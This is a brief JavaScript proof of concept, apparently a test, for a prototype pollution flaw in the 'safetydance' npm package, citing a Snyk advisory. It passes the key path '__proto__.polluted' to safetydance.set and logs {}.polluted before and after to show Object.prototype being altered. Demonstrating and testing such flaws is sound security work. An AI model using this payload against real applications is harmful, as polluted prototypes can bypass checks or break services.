// //https://snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687

// test("prototype pollution in safetydance", () => {
  const safetydance = require("safetydance");
  obj = {};

console.log({}.polluted);

  safetydance.set({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
